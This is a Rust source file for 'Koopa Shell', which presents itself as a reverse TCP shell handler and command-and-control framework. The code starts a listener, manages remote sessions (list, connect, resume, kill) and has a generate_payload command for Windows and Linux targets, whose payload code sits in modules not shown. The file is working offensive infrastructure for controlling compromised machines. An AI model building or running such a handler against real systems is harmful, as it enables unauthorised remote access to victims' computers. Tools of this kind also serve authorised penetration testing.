mod shell;
mod path_completer;

use std::sync::Arc;
use path_completer::PathCompleter;
use server_core::Server;
use crate::shell::{connect_to_shell, generate_payload};
use std::io::Write;
use clap::{command, Arg};
use std::process::Command;
use rustyline::{Editor, error::ReadlineError, Config};


fn banner() -> &'static str {

    r#"

M""MMMMM""M                                        MP""""""`MM dP                dP dP 
M  MMMM' .M                                        M  mmmmm..M 88                88 88    
M       .MM .d8888b. .d8888b. 88d888b. .d8888b.    M.      `YM 88d888b. .d8888b. 88 88 
M  MMMb. YM 88'  `88 88'  `88 88'  `88 88'  `88    MMMMMMM.  M 88'  `88 88ooood8 88 88 
M  MMMMb  M 88.  .88 88.  .88 88.  .88 88.  .88    M. .MMM'  M 88    88 88.  ... 88 88  
M  MMMMM  M `88888P' `88888P' 88Y888P' `88888P8    Mb.     .dM dP    dP `88888P' dP dP 
MMMMMMMMMMM                   88                   MMMMMMMMMMM                         
                              dP                                                              
    "#

}

#[tokio::main]
async fn main() {

    println!("\x1b[38;5;85m{}\x1b[0m", banner());
    println!("🐢 Koopa Shell! Multiple Reverse TCP Shell Handler | Stage 0/1 C2 framework 🐢\n");

    let arguments = command!()
        .arg(Arg::new("Server IP").default_value("0.0.0.0").help("Server IP to listen to connections").required(false))
        .arg(Arg::new("Server Port").default_value("4443").help("Server Port").required(false))
        .get_matches();

    let ip: &String = arguments.get_one::<String>("Server IP").expect("IP is required");
    let port: &String = arguments.get_one::<String>("Server Port").unwrap();

    let server: Arc<Server> = Arc::new(Server::new());
    
    let completer = PathCompleter::new();
    let mut rl: Editor<PathCompleter, rustyline::history::FileHistory> = Editor::with_config(Config::builder().auto_add_history(true).build()).expect("Failed to create editor");
    rl.set_helper(Some(completer));

    server.start(format!("{}:{}", ip, port).as_str());
    println!("\x1b[34;1m[+]\x1b[0m Handler started on port: {}\n", port);

    loop {
        
        let readline: Result<String, ReadlineError> = rl.readline("\x1b[38;5;154mKoopa> \x1b[0m");

        match readline {
            Ok(command) => {
                
                let _ = rl.add_history_entry(command.as_str()); 
                let command: &str = command.trim();

                if command.starts_with("connect ") {
                    let input_id: String = command.replacen("connect ", "", 1);

                    if let Some(id) = resolve_id(&server, &input_id) {
                        connect_to_shell(&server, &id);
                    }
                } 
                else if command.starts_with("resume ") {
                    let input_id: String = command.replacen("resume ", "", 1);

                    if let Some(id) = resolve_id(&server, &input_id) {
                        server.resume_connection(&id);
                    }
                } 
                else if command.starts_with("kill ") {
                    let input_id: String = command.replacen("kill ", "", 1);

                    if let Some(id) = resolve_id(&server, &input_id) {
                        server.kill(&id);
                    }
                }
                else if command.starts_with("generate_payload ") {
                    let os: String = command.replacen("generate_payload ", "", 1);
                    println!("{}", generate_payload(ip, port, &os));
                }
                else {
                    
                    match command {
                    
                        "" => continue,
                        "sessions" | "list" => server.list_connections(),
                        "help" => help_msg(),
                        "banner" => println!("\x1b[38;5;85m{}\x1b[0m", banner()),
                        "exit" => {
                            {
                                let _lock = server.stdout_mutex.lock().unwrap();
                                println!("[\x1b[31m+\x1b[0m] \x1b[37;1mShutting down the server and all connections!\x1b[0m");
                                std::io::stdout().flush().unwrap();
                            }
                    
                            break;
                        }
                        _ => {
                    
                            let parts: Vec<&str> = command.split_whitespace().collect();
                    
                            match Command::new(parts[0]).args(&parts[1..]).output() {
                    
                                Ok(output) => {
                                    let stdout = String::from_utf8(output.stdout).unwrap();
                                    println!("\n{}", stdout);
                                }
                    
                                Err(_) => {
                                    println!("\n[\x1b[38;5;227m!\x1b[0m] Invalid Shell Command!\n");
                                }
                            }
                        }
                    }
                }
            },
            Err(ReadlineError::Interrupted) => {
                println!("CTRL-C");
                break;
            },
            Err(ReadlineError::Eof) => {
                println!("CTRL-D");
                break;
            },
            Err(err) => {
                println!("Error: {:?}", err);
                break;
            }
        }
    }
}

fn help_msg() {

    println!("\n[\x1b[32;1m+\x1b[0m] \x1b[37;1;3m[Menu Comands]\x1b[0m [\x1b[32;1m+\x1b[0m]\n");
    println!(".____________________________________________________________________________________________________________.\n");
    println!("      \x1b[32;1mgenerate_payload <Type>\x1b[0m - \x1b[37;1mGenerate Payload for the suported operational systems (Windows, Linux)\x1b[0m");
    println!("      \x1b[32;1mlist\x1b[0m - \x1b[37;1mList Stored Sessions\x1b[0m");
    println!("      \x1b[32;1mkill <ID>\x1b[0m - \x1b[37;1mKill Stored Sessions\x1b[0m");
    println!("      \x1b[32;1mconnect <ID>\x1b[0m - \x1b[37;1mConnect to Created Session\x1b[0m");
    println!("      \x1b[32;1mresume <ID>\x1b[0m - \x1b[37;1mResume Suspended Session to Connect Again!\x1b[0m");
    println!("      \x1b[32;1mexit\x1b[0m - \x1b[37;1mClose Server Handler and kill all Sessions\x1b[0m");
    println!("      \x1b[32;1mhelp\x1b[0m - \x1b[37;1mPrint Help\x1b[0m");
    println!(".__________________________________________________________________________________________________________.\n\n");
}

fn resolve_id(server: &Server, input: &str) -> Option<String> {

    if let Ok(number) = input.parse::<u32>() {

        let id_number: std::sync::MutexGuard<'_, std::collections::HashMap<u32, String>> = server.index_id.lock().unwrap();
        if let Some(full_id) = id_number.get(&number) {

            return Some(full_id.clone());
        } 
        else {
            println!("[X] No session found for number {}", number);
            return None;
        }
    } else {
        Some(input.to_string())
    }
}
